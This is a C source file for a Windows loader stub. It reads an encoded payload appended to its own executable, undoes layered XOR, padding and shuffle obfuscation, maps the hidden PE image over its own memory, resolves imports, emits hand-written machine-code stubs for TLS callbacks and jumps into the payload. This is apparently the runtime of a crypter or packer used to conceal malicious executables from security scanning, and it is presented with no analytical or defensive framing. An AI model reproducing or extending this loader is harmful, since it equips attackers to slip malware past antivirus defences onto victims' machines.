#include <windows.h>

static void* my_memset(void* dest, int c, size_t n) {
    unsigned char* p = (unsigned char*)dest;
    while (n--) *p++ = (unsigned char)c;
    return dest;
}

static void* my_memcpy(void* dest, const void* src, size_t n) {
    unsigned char* d = (unsigned char*)dest;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
    return dest;
}

static void* my_memmove(void* dest, const void* src, size_t n) {
    unsigned char* d = (unsigned char*)dest;
    const unsigned char* s = (const unsigned char*)src;
    if (d < s) { while (n--) *d++ = *s++; }
    else { d += n; s += n; while (n--) *--d = *--s; }
    return dest;
}

static void DecodePayload(BYTE* data, DWORD payload_len, BYTE** out_payload) {
    BYTE num_ops = data[0];
    BYTE* op_ids = data + 1;
    BYTE xor_key = data[1 + num_ops];
    BYTE* encoded_data = data + 1 + num_ops + 1;
    DWORD encoded_len = payload_len - 1 - num_ops - 1;
    
    LPVOID decode_buf = VirtualAlloc(NULL, encoded_len * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decode_buf) { *out_payload = NULL; return; }
    
    my_memcpy(decode_buf, encoded_data, encoded_len);
    DWORD current_len = encoded_len;
    
    for (int i = num_ops - 1; i >= 0; i--) {
        BYTE op = op_ids[i];
        switch(op) {
            case 0: for (DWORD j = 0; j < current_len; j++) ((BYTE*)decode_buf)[j] ^= xor_key; break;  // xor_full
            case 1: for (DWORD j = 0; j < current_len; j++) if (j % 4 != 3) ((BYTE*)decode_buf)[j] ^= xor_key; break;  // xor_75
            case 2: for (DWORD j = 0; j < current_len; j += 2) ((BYTE*)decode_buf)[j] ^= xor_key; break;  // xor_50
            case 3: for (DWORD j = 0; j < current_len; j += 4) ((BYTE*)decode_buf)[j] ^= xor_key; break;  // xor_25
            case 4: { DWORD ps = current_len / 3; my_memmove(decode_buf, (BYTE*)decode_buf + ps, current_len - ps); current_len -= ps; break; }  // pad_front
            case 5: { current_len -= current_len / 3; break; }  // pad_back
            case 6: {  // shuffle
                LPVOID temp = VirtualAlloc(NULL, current_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (temp) {
                    DWORD half = current_len / 2;
                    for (DWORD j = 0; j < half; j++) {
                        ((BYTE*)temp)[j] = ((BYTE*)decode_buf)[j * 2];
                        ((BYTE*)temp)[half + j] = ((BYTE*)decode_buf)[j * 2 + 1];
                    }
                    if (current_len % 2) ((BYTE*)temp)[current_len - 1] = ((BYTE*)decode_buf)[current_len - 1];
                    my_memcpy(decode_buf, temp, current_len);
                    VirtualFree(temp, 0, MEM_RELEASE);
                }
                break;
            }
            default: break;
        }
    }
    *out_payload = (BYTE*)decode_buf;
}

static LPVOID ReadPayload(DWORD* out_len) {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    HANDLE hFile = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(hFile, NULL);
    if (sz < 4) { CloseHandle(hFile); return NULL; }
    SetFilePointer(hFile, sz - 4, NULL, FILE_BEGIN);
    DWORD payload_len, bytesRead;
    ReadFile(hFile, &payload_len, 4, &bytesRead, NULL);
    if (payload_len == 0 || payload_len > sz - 4) { CloseHandle(hFile); return NULL; }
    SetFilePointer(hFile, sz - 4 - payload_len, NULL, FILE_BEGIN);
    LPVOID buf = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);
    if (!buf) { CloseHandle(hFile); return NULL; }
    ReadFile(hFile, buf, payload_len, &bytesRead, NULL);
    CloseHandle(hFile);
    *out_len = payload_len;
    return buf;
}

void __cdecl mainCRTStartup(void) {
   
    DWORD payload_len;
    LPVOID buf = ReadPayload(&payload_len);
    if (!buf) ExitProcess(1);
    
    BYTE* payload;
    DecodePayload(buf, payload_len, &payload);
    if (!payload) ExitProcess(1);
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payload;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) ExitProcess(1);
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(payload + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) ExitProcess(1);
    
    LPVOID loaderBase = (LPVOID)GetModuleHandleA(NULL);
    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
    DWORD entryRVA = pNt->OptionalHeader.AddressOfEntryPoint;
    DWORD headerSize = pNt->OptionalHeader.SizeOfHeaders;
    
    if (loaderBase != (LPVOID)(DWORD_PTR)pNt->OptionalHeader.ImageBase) ExitProcess(1);
    
    LPVOID expandedImage = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);
    if (!expandedImage) ExitProcess(1);
    
    my_memset(expandedImage, 0, imageSize);
    my_memcpy(expandedImage, payload, headerSize);
    
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            my_memcpy((BYTE*)expandedImage + pSec[i].VirtualAddress,
                   payload + pSec[i].PointerToRawData, pSec[i].SizeOfRawData);
        }
    }
    
    PIMAGE_NT_HEADERS pExpNt = (PIMAGE_NT_HEADERS)((BYTE*)expandedImage + pDos->e_lfanew);
    PIMAGE_DATA_DIRECTORY pImportDir = &pExpNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (pImportDir->VirtualAddress && pImportDir->Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)expandedImage + pImportDir->VirtualAddress);
        while (pImport->Name) {
            HMODULE hDll = LoadLibraryA((char*)((BYTE*)expandedImage + pImport->Name));
            if (hDll) {
                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)expandedImage + pImport->FirstThunk);
                PIMAGE_THUNK_DATA pOrigThunk = pImport->OriginalFirstThunk ? 
                    (PIMAGE_THUNK_DATA)((BYTE*)expandedImage + pImport->OriginalFirstThunk) : pThunk;
                while (pOrigThunk->u1.AddressOfData) {
                    FARPROC func;
                    if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                        func = GetProcAddress(hDll, (LPCSTR)(pOrigThunk->u1.Ordinal & 0xFFFF));
                    else
                        func = GetProcAddress(hDll, ((PIMAGE_IMPORT_BY_NAME)((BYTE*)expandedImage + pOrigThunk->u1.AddressOfData))->Name);
                    if (func) pThunk->u1.Function = (DWORD_PTR)func;
                    pThunk++; pOrigThunk++;
                }
            }
            pImport++;
        }
    }
    
    // TLS 处理
    DWORD jumpTargetRVA = entryRVA;
    PIMAGE_DATA_DIRECTORY pTlsDir = &pExpNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    
    if (pTlsDir->VirtualAddress && pTlsDir->Size) {
#if defined(__i386__) || defined(_M_IX86)
        DWORD tlsCallbacksVA = *(DWORD*)((BYTE*)expandedImage + pTlsDir->VirtualAddress + 12);
#else
        ULONGLONG tlsCallbacksVA = *(ULONGLONG*)((BYTE*)expandedImage + pTlsDir->VirtualAddress + 24);
#endif
        if (tlsCallbacksVA) {
            BYTE* stub = (BYTE*)expandedImage + 0x40;
            int p = 0;
            
#if defined(__i386__) || defined(_M_IX86)
            stub[p++] = 0xBE; *(DWORD*)(stub+p) = (DWORD)tlsCallbacksVA; p += 4;
            stub[p++] = 0xFC;
            stub[p++] = 0xAD;
            stub[p++] = 0x85; stub[p++] = 0xC0;
            stub[p++] = 0x74; stub[p++] = 0x0D;
            stub[p++] = 0x6A; stub[p++] = 0x00;
            stub[p++] = 0x6A; stub[p++] = 0x01;
            stub[p++] = 0x68; *(DWORD*)(stub+p) = (DWORD)(DWORD_PTR)loaderBase; p += 4;
            stub[p++] = 0xFF; stub[p++] = 0xD0;
            stub[p++] = 0xEB; stub[p++] = 0xED;
            stub[p++] = 0xE9;
            *(DWORD*)(stub+p) = entryRVA - (0x40 + p + 4); p += 4;
#else
            stub[p++] = 0x49; stub[p++] = 0xBC;
            *(ULONGLONG*)(stub+p) = (ULONGLONG)loaderBase; p += 8;
            stub[p++] = 0x48; stub[p++] = 0xBE;
            *(ULONGLONG*)(stub+p) = tlsCallbacksVA; p += 8;
            int loop = p;
            stub[p++] = 0x48; stub[p++] = 0xAD;
            stub[p++] = 0x48; stub[p++] = 0x85; stub[p++] = 0xC0;
            stub[p++] = 0x74;
            int jz_off = p++;
            stub[p++] = 0x48; stub[p++] = 0x83; stub[p++] = 0xEC; stub[p++] = 0x28;
            stub[p++] = 0x4C; stub[p++] = 0x89; stub[p++] = 0xE1;
            stub[p++] = 0xBA; *(DWORD*)(stub+p) = 1; p += 4;
            stub[p++] = 0x45; stub[p++] = 0x31; stub[p++] = 0xC0;
            stub[p++] = 0xFF; stub[p++] = 0xD0;
            stub[p++] = 0x48; stub[p++] = 0x83; stub[p++] = 0xC4; stub[p++] = 0x28;
            stub[p++] = 0xEB; stub[p++] = (BYTE)(loop - p - 1);
            stub[jz_off] = (BYTE)(p - jz_off - 1);
            stub[p++] = 0xE9;
            *(DWORD*)(stub+p) = entryRVA - (0x40 + p + 4); p += 4;
#endif
            jumpTargetRVA = 0x40;
        }
    }
    
    DWORD oldProtect;
    if (!VirtualProtect(loaderBase, imageSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        for (DWORD off = 0; off < imageSize; off += 0x1000)
            VirtualProtect((BYTE*)loaderBase + off, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
    }
    
    DWORD_PTR jumpTarget = (DWORD_PTR)loaderBase + jumpTargetRVA;
    
#if defined(__i386__) || defined(_M_IX86)
    unsigned char jmpstub[] = { 0xFC, 0xF3, 0xA4, 0xFF, 0xE3 };
#else
    unsigned char jmpstub[] = { 0xFC, 0xF3, 0x48, 0xA4, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x28, 0xFF, 0xE3 };
#endif
    LPVOID stubMem = VirtualAlloc(NULL, sizeof(jmpstub), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    my_memcpy(stubMem, jmpstub, sizeof(jmpstub));
    
    __asm__ volatile (
        "jmp *%4\n\t"
        :
        : "D"(loaderBase), "S"(expandedImage), "c"(imageSize), "b"(jumpTarget), "r"(stubMem)
    );
}
